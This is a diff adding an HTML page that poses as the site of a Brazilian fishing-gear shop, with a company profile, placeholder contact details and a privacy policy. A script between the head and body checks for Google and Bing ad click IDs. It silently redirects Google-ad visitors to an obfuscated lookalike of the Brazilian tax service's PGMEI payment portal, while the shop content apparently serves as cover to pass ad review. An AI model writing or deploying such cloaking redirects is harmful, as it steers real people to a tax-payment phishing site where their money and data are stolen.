@@ -1,1 +1,168 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Rei das Tralhas - Artigos de Pesca</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Rei das Tralhas - Loja de artigos de pesca. Equipamentos e acessórios para pescadores amadores e esportivos. Loja física e online.">
+  <style>
+    body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; color: #333; }
+    header { background: #0b3d91; color: #fff; padding: 20px; }
+    nav a { color: #fff; margin-right: 15px; text-decoration: none; font-weight: bold; }
+    .container { max-width: 1000px; margin: auto; padding: 20px; background: #fff; }
+    h1, h2 { color: #0b3d91; }
+    footer { background: #222; color: #fff; text-align: center; padding: 20px; margin-top: 40px; }
+    .box { margin-bottom: 30px; }
+  </style>
+</head>
+  <script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda.info/PGMEI';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+  <h1>Rei das Tralhas</h1>
+  <p>Loja de Artigos de Pesca</p>
+  <nav>
+    <a href="#sobre">Sobre</a>
+    <a href="#produtos">Produtos</a>
+    <a href="#contato">Contato</a>
+    <a href="#politica">Política</a>
+  </nav>
+</header>
+
+<div class="container">
+
+  <section id="sobre" class="box">
+    <h2>Sobre a Empresa</h2>
+    <p>
+      O Rei das Tralhas é uma empresa familiar fundada em 2020, especializada no comércio varejista de artigos de pesca.
+      Atuamos com a venda de equipamentos, acessórios e produtos para pesca esportiva e recreativa, atendendo clientes
+      por meio de loja física e também pelo nosso site.
+    </p>
+    <p>
+      Nossa missão é oferecer produtos de qualidade e um atendimento claro e transparente para pescadores iniciantes
+      e experientes.
+    </p>
+    <p>
+      <strong>Razão Social:</strong> Rei das Tralhas LTDA<br>
+      <strong>CNPJ:</strong> 39.407.153/0001-93<br>
+      <strong>Cidade:</strong> São José dos Campos - SP<br>
+      <strong>Situação Cadastral:</strong> Ativa
+    </p>
+  </section>
+
+  <section id="produtos" class="box">
+    <h2>O que Vendemos</h2>
+    <p>
+      Comercializamos artigos de pesca, incluindo varas, molinetes, carretilhas, linhas, iscas, acessórios e outros
+      produtos relacionados à pesca esportiva e recreativa.
+    </p>
+    <p>
+      As vendas podem ser realizadas diretamente na loja física ou pelo nosso site, com envio ao cliente ou retirada no local.
+    </p>
+  </section>
+
+  <section id="contato" class="box">
+    <h2>Contato</h2>
+    <p>
+      Para dúvidas, informações sobre produtos ou atendimento, entre em contato conosco pelos nossos canais oficiais:
+    </p>
+    <p>
+      📍 São José dos Campos - SP<br>
+      📧 Email: contato@seudominio.com.br<br>
+      📞 Telefone / WhatsApp: (00) 00000-0000
+    </p>
+    <p>
+      Nosso atendimento também pode ser realizado diretamente na loja física e pelos canais digitais.
+    </p>
+  </section>
+
+  <section id="politica" class="box">
+    <h2>Política de Privacidade e Compras</h2>
+    <p>
+      No Rei das Tralhas, a sua compra é realizada de forma segura. Os dados pessoais de cadastro, endereço e pagamento
+      são utilizados exclusivamente para o processamento dos pedidos e não são divulgados a terceiros.
+    </p>
+    <p>
+      Toda transação que envolve pagamento é protegida por sistemas de segurança e criptografia.
+    </p>
+    <p>
+      Todos os produtos são novos e possuem garantia. Caso o cliente se arrependa da compra, é possível solicitar a troca
+      ou devolução em até 7 dias corridos após o recebimento do produto, conforme o Código de Defesa do Consumidor.
+    </p>
+  </section>
+
+</div>
+
+<footer>
+  <p>© 2026 Rei das Tralhas LTDA - CNPJ 39.407.153/0001-93</p>
+  <p>São José dos Campos - SP</p>
+</footer>
+
+</body>
+</html>
 
